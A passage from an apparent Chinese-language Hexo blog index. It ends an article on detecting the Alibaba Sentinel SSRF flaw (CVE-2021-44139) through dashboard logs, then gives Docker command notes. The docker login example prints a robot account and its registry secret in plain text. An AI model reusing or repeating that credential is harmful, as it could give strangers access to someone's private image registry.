class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654320000&amp;endTime=1708654326000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">29.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654327000&amp;endTime=1708654333000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">36.878</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654334000&amp;endTime=1708654340000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">43.857</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654341000&amp;endTime=1708654347000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">50.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654348000&amp;endTime=1708654354000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57.904</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654355000&amp;endTime=1708654361000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">04.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654362000&amp;endTime=1708654368000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654369000&amp;endTime=1708654375000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">18.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654376000&amp;endTime=1708654382000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><br></code></pre></td></tr></table></figure><h3 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h3><p>检查 控制台-&gt;机器列表中是否存在未知异常的机器信息</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Report a Sentinel Security Vulnerability about SSRF #2451 threedr3am Nov 18, 2021<br>链接：<a href="https://github.com/alibaba/Sentinel/issues/2451">https://github.com/alibaba/Sentinel/issues/2451</a></p><p>[2] Alibaba Sentinel SSRF漏洞(CVE-2021-44139)浅析 ordar 2022-08-30</p><p>链接：<a href="https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/">https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_install</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_install/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="安装指定版本docker"><a href="#安装指定版本docker" class="headerlink" title="安装指定版本docker"></a>安装指定版本docker</h4><h5 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h5><h3 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h3><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h2 id="uninstall"><a href="#uninstall" class="headerlink" title="uninstall"></a>uninstall</h2><h3 id="ubuntu-1"><a href="#ubuntu-1" class="headerlink" title="ubuntu"></a>ubuntu</h3><h3 id="redhat-1"><a href="#redhat-1" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac-1"><a href="#mac-1" class="headerlink" title="mac"></a>mac</h3><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_command</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_command/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h1 id="docker服务"><a href="#docker服务" class="headerlink" title="docker服务"></a>docker服务</h1><h2 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h2><h3 id="docker-info"><a href="#docker-info" class="headerlink" title="docker info"></a>docker info</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">test</span> <span class="hljs-string">docker</span> <span class="hljs-string">info</span><br><span class="hljs-attr">Client:</span><br> <span class="hljs-attr">Context:</span>    <span class="hljs-string">default</span><br> <span class="hljs-attr">Debug Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Plugins:</span><br>  <span class="hljs-attr">buildx:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Buildx</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.8.2)</span><br>  <span class="hljs-attr">compose:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Compose</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v2.7.0)</span><br>  <span class="hljs-attr">extension:</span> <span class="hljs-string">Manages</span> <span class="hljs-string">Docker</span> <span class="hljs-string">extensions</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.2.8)</span><br>  <span class="hljs-attr">sbom:</span> <span class="hljs-string">View</span> <span class="hljs-string">the</span> <span class="hljs-string">packaged-based</span> <span class="hljs-string">Software</span> <span class="hljs-string">Bill</span> <span class="hljs-string">Of</span> <span class="hljs-string">Materials</span> <span class="hljs-string">(SBOM)</span> <span class="hljs-string">for</span> <span class="hljs-string">an</span> <span class="hljs-string">image</span> <span class="hljs-string">(Anchore</span> <span class="hljs-string">Inc.,</span> <span class="hljs-number">0.6</span><span class="hljs-number">.0</span><span class="hljs-string">)</span><br>  <span class="hljs-attr">scan:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Scan</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.17.0)</span><br><br><span class="hljs-attr">Server:</span><br> <span class="hljs-attr">Containers:</span> <span class="hljs-number">10</span><br>  <span class="hljs-attr">Running:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">Paused:</span> <span class="hljs-number">0</span><br>  <span class="hljs-attr">Stopped:</span> <span class="hljs-number">8</span><br> <span class="hljs-attr">Images:</span> <span class="hljs-number">14</span><br> <span class="hljs-attr">Server Version:</span> <span class="hljs-number">20.10</span><span class="hljs-number">.17</span><br> <span class="hljs-attr">Storage Driver:</span> <span class="hljs-string">overlay2</span><br>  <span class="hljs-attr">Backing Filesystem:</span> <span class="hljs-string">extfs</span><br>  <span class="hljs-attr">Supports d_type:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">Native Overlay Diff:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">userxattr:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Logging Driver:</span> <span class="hljs-string">json-file</span><br> <span class="hljs-attr">Cgroup Driver:</span> <span class="hljs-string">cgroupfs</span><br> <span class="hljs-attr">Cgroup Version:</span> <span class="hljs-number">2</span><br> <span class="hljs-attr">Plugins:</span><br>  <span class="hljs-attr">Volume:</span> <span class="hljs-string">local</span><br>  <span class="hljs-attr">Network:</span> <span class="hljs-string">bridge</span> <span class="hljs-string">host</span> <span class="hljs-string">ipvlan</span> <span class="hljs-string">macvlan</span> <span class="hljs-literal">null</span> <span class="hljs-string">overlay</span><br>  <span class="hljs-attr">Log:</span> <span class="hljs-string">awslogs</span> <span class="hljs-string">fluentd</span> <span class="hljs-string">gcplogs</span> <span class="hljs-string">gelf</span> <span class="hljs-string">journald</span> <span class="hljs-string">json-file</span> <span class="hljs-string">local</span> <span class="hljs-string">logentries</span> <span class="hljs-string">splunk</span> <span class="hljs-string">syslog</span><br> <span class="hljs-attr">Swarm:</span> <span class="hljs-string">inactive</span><br> <span class="hljs-attr">Runtimes:</span> <span class="hljs-string">runc</span> <span class="hljs-string">io.containerd.runc.v2</span> <span class="hljs-string">io.containerd.runtime.v1.linux</span><br> <span class="hljs-attr">Default Runtime:</span> <span class="hljs-string">runc</span><br> <span class="hljs-attr">Init Binary:</span> <span class="hljs-string">docker-init</span><br> <span class="hljs-attr">containerd version:</span> <span class="hljs-string">10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1</span><br> <span class="hljs-attr">runc version:</span> <span class="hljs-string">v1.1.2-0-ga916309</span><br> <span class="hljs-attr">init version:</span> <span class="hljs-string">de40ad0</span><br> <span class="hljs-attr">Security Options:</span><br>  <span class="hljs-string">seccomp</span><br>   <span class="hljs-attr">Profile:</span> <span class="hljs-string">default</span><br>  <span class="hljs-string">cgroupns</span><br> <span class="hljs-attr">Kernel Version:</span> <span class="hljs-number">5.10</span><span class="hljs-number">.104</span><span class="hljs-string">-linuxkit</span><br> <span class="hljs-attr">Operating System:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Desktop</span><br> <span class="hljs-attr">OSType:</span> <span class="hljs-string">linux</span><br> <span class="hljs-attr">Architecture:</span> <span class="hljs-string">aarch64</span><br> <span class="hljs-attr">CPUs:</span> <span class="hljs-number">4</span><br> <span class="hljs-attr">Total Memory:</span> <span class="hljs-number">3.</span><span class="hljs-string">841GiB</span><br> <span class="hljs-attr">Name:</span> <span class="hljs-string">docker-desktop</span><br> <span class="hljs-attr">ID:</span> <span class="hljs-string">4PPK:ZEQN:27ZX:7RDL:BASL:RHIO:UZXN:DTSX:UHWP:HBFU:2DYI:EJRN</span><br> <span class="hljs-attr">Docker Root Dir:</span> <span class="hljs-string">/var/lib/docker</span><br> <span class="hljs-attr">Debug Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">HTTP Proxy:</span> <span class="hljs-string">http.docker.internal:3128</span><br> <span class="hljs-attr">HTTPS Proxy:</span> <span class="hljs-string">http.docker.internal:3128</span><br> <span class="hljs-attr">No Proxy:</span> <span class="hljs-string">hubproxy.docker.internal</span><br> <span class="hljs-attr">Registry:</span> <span class="hljs-string">https://index.docker.io/v1/</span><br> <span class="hljs-attr">Labels:</span><br> <span class="hljs-attr">Experimental:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Insecure Registries:</span><br>  <span class="hljs-string">hubproxy.docker.internal:5000</span><br>  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/8</span><br> <span class="hljs-attr">Registry Mirrors:</span><br>  <span class="hljs-string">https://zp98nloz.mirror.aliyuncs.com/</span><br> <span class="hljs-attr">Live Restore Enabled:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h1 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h1><h2 id="登录镜像仓库"><a href="#登录镜像仓库" class="headerlink" title="登录镜像仓库"></a>登录镜像仓库</h2><h3 id="docker-login"><a href="#docker-login" class="headerlink" title="docker login"></a>docker login</h3><p><strong>docker login [OPTIONS] [SERVER] [flags]</strong></p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>以用户名&#x2F;密码或机器人账户&#x2F;密钥方式登录指定镜像仓库</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h4><h5 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password string </span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password-stdin</span><br></code></pre></td></tr></table></figure><h5 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--username string</span><br></code></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>机器人账户：robot-0207</p><p>机器人密钥：wlRCBQX68DCZIrCHoSAvACm1xpdadTBF</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  test docker <span class="hljs-keyword">login</span> registry.xxx.xxx.com -u robot<span class="hljs-number">-0227</span> -p wlRCBQX68DCZIrCHoSAvACm1xpdadTBF<br><span class="hljs-built_in">WARNING</span>! <span class="hljs-keyword">Using</span> <span class="hljs-comment">--password via the CLI is insecure. Use --password-stdin.</span><br><span class="hljs-keyword">Login</span> Succeeded<br></code></pre></td></tr></table></figure><h2 id="退出镜仓库"><a href="#退出镜仓库" class="headerlink" title="退出镜仓库"></a>退出镜仓库</h2><h3 id="docker-logout"><a href="#docker-logout" class="headerlink" title="docker logout"></a>docker logout</h3><p><strong>docker logout [SERVER] [flags]</strong></p><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>退出指定镜像仓库</p><h4 id="SERVER-1"><a href="#SERVER-1" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  <span class="hljs-symbol">~ docker logout</span><br><span class="hljs-symbol">Removing login credentials for https</span>:<span class="hljs-comment">//index.docker.io/v1/</span><br></code></pre></td></tr></table></figure><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h2><h3 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h3><p><strong>docker search [OPTIONS] TEAM</strong></p><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>默认官方 Docker Hub （hub.docker.com）查找镜像</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-–filter-filter"><a href="#f-–filter-filter" class="headerlink" title="-f –filter filter"></a>-f –filter filter</h5><p>Filter output based on conditions provided 根据过滤条件过滤镜像</p><h5 id="–no-trunc"><a href="#–no-trunc" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整的镜像描述</p><h5 id="–limit-ini"><a href="#–limit-ini" class="headerlink" title="–limit ini"></a>–limit ini</h5><p>Max number of search results (default 25) 搜索结果的最大数目(默认25个)</p><h5 id="–format-string"><a href="#–format-string" class="headerlink" title="–format string"></a>–format string</h5><p>Pretty-print search using a Go template</p><h4 id="TEAM"><a href="#TEAM" class="headerlink" title="TEAM"></a>TEAM</h4><p>指定需要查询的镜像名</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><h5 id="查找镜像名包含memcached且收藏数大于10的镜像"><a href="#查找镜像名包含memcached且收藏数大于10的镜像" class="headerlink" title="查找镜像名包含memcached且收藏数大于10的镜像"></a>查找镜像名包含memcached且收藏数大于10的镜像</h5><p>docker search -f stars&#x3D;10 memcached –no-trunc</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  /tmp docker <span class="hljs-keyword">search</span> -f stars=<span class="hljs-number">10</span> memcached <span class="hljs-comment">--no-trunc</span><br><span class="hljs-type">NAME</span>                       DESCRIPTION                                                                       STARS     OFFICIAL   AUTOMATED<br>memcached                  Free &amp; <span class="hljs-keyword">open</span> source, high-performance, distributed memory <span class="hljs-keyword">object</span> caching <span class="hljs-keyword">system</span>.   <span class="hljs-number">2135</span>      [OK]       <br>bitnami/memcached          Bitnami Memcached Docker Image                                                    <span class="hljs-number">32</span>                   [OK]<br>sylvainlasnier/memcached   Memcached docker images based <span class="hljs-keyword">on</span> Ubuntu <span class="hljs-number">14.10</span>. It <span class="hljs-keyword">is</span> small <span class="hljs-keyword">and</span> basic.             <span class="hljs-number">28</span>                   [OK]<br>rapidfort/memcached-ib     RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached IronBank                        <span class="hljs-number">12</span>                   <br>rapidfort/memcached        RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached                                 <span class="hljs-number">11</span>                   <br>prom/memcached-exporter    Exports metrics <span class="hljs-keyword">from</span> memcached servers <span class="hljs-keyword">for</span> consumption <span class="hljs-keyword">by</span> Prometheus.             <span class="hljs-number">10</span>               <br></code></pre></td></tr></table></figure><p>NAME：镜像名</p><p>DESCRIPTION：描述</p><p>START：关注数</p><p>OFFICIAL：是否为docker官方发布</p><p>AUTOMATED：自动构建</p><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><p><strong>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</strong></p><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>从镜像仓库中拉取或者更新指定镜像，如不选定版本号，则下载最新镜像</p><h4 id="OPTIONS-1"><a href="#OPTIONS-1" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a-–all-tags"><a href="#a-–all-tags" class="headerlink" title="-a –all-tags"></a>-a –all-tags</h5><p>拉取所有tagged镜像</p><h5 id="–distable-content-trust"><a href="#–distable-content-trust" class="headerlink" title="–distable-content-trust"></a>–distable-content-trust</h5><p>忽略镜像的校验，默认是开启校验的</p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>1、pull命令中的NAME，取决于<a href="https://hub.docker.com/%E4%B8%AD%E6%98%BE%E7%A4%BA%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%90%8D%E3%80%82">https://hub.docker.com/中显示的软件名。</a></p><p>例如：</p><p>下载 mysql 8.3.0 版本，使用 docker pull mysql:8.3.0</p><p>下载 grafana&#x2F;grafana 10.2.4 版本，使用 docker pull grafana&#x2F;grafana:10.2.4 </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:6.3.3</span><br><span class="hljs-number">6.3</span><span class="hljs-number">.3</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br>[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:8.2.6</span><br><span class="hljs-number">8.2</span><span class="hljs-number">.6</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br><br>[root@localhost grafana]<span class="hljs-comment"># docker images | grep grafana</span><br>grafana/grafana                                                   <span class="hljs-number">8.2</span><span class="hljs-number">.6</span>     aeeaa96eea83   <span class="hljs-number">5</span> months ago   <span class="hljs-number">253</span>MB<br>grafana/grafana                                                   <span class="hljs-number">6.3</span><span class="hljs-number">.3</span>     a6e14b4109af   <span class="hljs-number">2</span> years ago    <span class="hljs-number">253</span>MB<br></code></pre></td></tr></table></figure><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>从 docker hub 下载最新版memcached</p><p>docker pull memcached</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">(base) root@localhost:~<span class="hljs-comment"># docker pull memcached:latest</span><br><span class="hljs-section">latest: Pulling from library/memcached</span><br><span class="hljs-section">c229119241af: Pull complete </span><br><span class="hljs-section">af2f0309d301: Pull complete </span><br><span class="hljs-section">35783664a727: Pull complete </span><br><span class="hljs-section">a0d63d088cef: Pull complete </span><br><span class="hljs-section">d2f1f521665d: Pull complete </span><br><span class="hljs-section">24f6b2ace768: Pull complete </span><br><span class="hljs-section">Digest: sha256:c42541495ec1a6925cb105635bcafeedf60a56e3b9e4ac8b1afaf6d7851d70b2</span><br><span class="hljs-section">Status: Downloaded newer image for memcached:latest</span><br><span class="hljs-section">docker.io/library/memcached:latest</span><br></code></pre></td></tr></table></figure><h2 id="查看镜像历史"><a href="#查看镜像历史" class="headerlink" title="查看镜像历史"></a>查看镜像历史</h2><h3 id="docker-history"><a href="#docker-history" class="headerlink" title="docker history"></a>docker history</h3><p><strong>docker history [OPTIONS] images</strong></p><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的历史提交记录信息</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql               <br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      